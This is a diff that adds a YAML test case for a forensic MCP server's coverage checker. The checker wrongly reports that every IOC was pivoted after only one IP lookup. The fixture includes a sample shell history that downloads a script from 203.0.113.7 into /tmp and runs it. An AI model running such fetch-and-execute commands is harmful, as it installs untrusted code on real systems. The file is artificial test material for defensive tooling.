@@ -1,0 +1,65 @@
+# Matrix case P1024-008: assess_coverage decides the IOC-pivot gap only by
+# whether bulk_ioc_lookup appears anywhere in audit.json
+# ("bulk_ioc_lookup" not in called). After a lookup of one IP, a finding with
+# a different public IP that was never looked up passes as "all flagged IOCs
+# were pivoted".
+# bulk_ioc_lookup uses the bundled offline cache; nothing leaves the container.
+case_id: P1024-008
+problem: P1024
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "조사 중에 앞서 조회한 IOC와 다른 새 IOC가 나오는 것은 흔한 흐름이다."
+coverage: full
+summary: bulk_ioc_lookup is run on 198.51.100.20 only; a later finding names 203.0.113.7 from the shell history, and assess_coverage with that finding reports no IOC gap and "all flagged IOCs were pivoted".
+summary_ko: "`bulk_ioc_lookup`은 `198.51.100.20` 하나만 조회했다. 그 뒤 셸 기록에서 나온 `203.0.113.7`을 담은 발견을 넘기자 `assess_coverage`는 IOC 공백을 내지 않고 \"all flagged IOCs were pivoted\"라고 한다."
+defect_ko: "이 서버의 `assess_coverage`는 `bulk_ioc_lookup`이 기록에 한 번이라도 있으면 발견의 모든 공인 IOC를 조회한 것으로 본다. 발견에 든 IOC마다 조회했는지 확인해야 한다. 모델은 조회하지 않은 `203.0.113.7`도 평판을 확인했다고 잘못 안다."
+setup_ko: "`198.51.100.20`의 실패 로그인이 든 `auth.log`와, `203.0.113.7`에서 내려받는 명령이 든 `.bash_history`를 두었다."
+fixture:
+  - path: var/log/auth.log
+    text: |
+      Mar  3 01:40:11 web01 sshd[1902]: Failed password for root from 198.51.100.20 port 40112 ssh2
+      Mar  3 01:40:14 web01 sshd[1902]: Failed password for root from 198.51.100.20 port 40112 ssh2
+      Mar  3 01:40:18 web01 sshd[1905]: Invalid user oracle from 198.51.100.20 port 40130
+      Mar  3 01:40:20 web01 sshd[1905]: Failed password for invalid user oracle from 198.51.100.20 port 40130 ssh2
+  - path: home/alice/.bash_history
+    text: |
+      ls -la
+      wget http://203.0.113.7/k.sh -O /tmp/.k.sh
+      chmod +x /tmp/.k.sh && /tmp/.k.sh
+steps:
+  - tool: auth_summary
+    note_ko: "인증 로그에서 `198.51.100.20`이 나온다"
+    args:
+      path: ${EVIDENCE}/var/log/auth.log
+  - tool: bulk_ioc_lookup
+    note_ko: "그 IP 하나만 조회한다"
+    args:
+      text: "198.51.100.20"
+  - tool: analyze_bash_history
+    note_ko: "셸 기록에서 새 IP `203.0.113.7`이 나온다"
+    args:
+      path: ${EVIDENCE}/home/alice/.bash_history
+  - tool: assess_coverage
+    note_ko: "결함 호출: 새 IP가 든 발견을 넘겨 범위를 점검함"
+    args:
+      findings_json: '[{"id": "f1", "confidence": "inference", "statement": "alice downloaded and ran a script from 203.0.113.7", "evidence": "home/alice/.bash_history:2"}]'
+expect:
+  - step: 2
+    note_ko: "조회한 공인 IP는 하나다"
+    contains: "## Public IPs (1)"
+  - step: 2
+    note_ko: "새 IP는 조회 대상에 없다"
+    not_contains: "203.0.113.7"
+  - step: 3
+    note_ko: "셸 기록 분석이 새 IP를 보인다"
+    contains: "203.0.113.7"
+  - step: 4
+    note_ko: "조회하지 않은 IP가 있는데 모든 IOC를 조회했다고 한다"
+    contains: "all flagged IOCs were pivoted"
+  - step: 4
+    note_ko: "조사 범위에 빈틈이 없다고 판정한다"
+    contains: "**Verdict: COVERAGE CLEAN**"
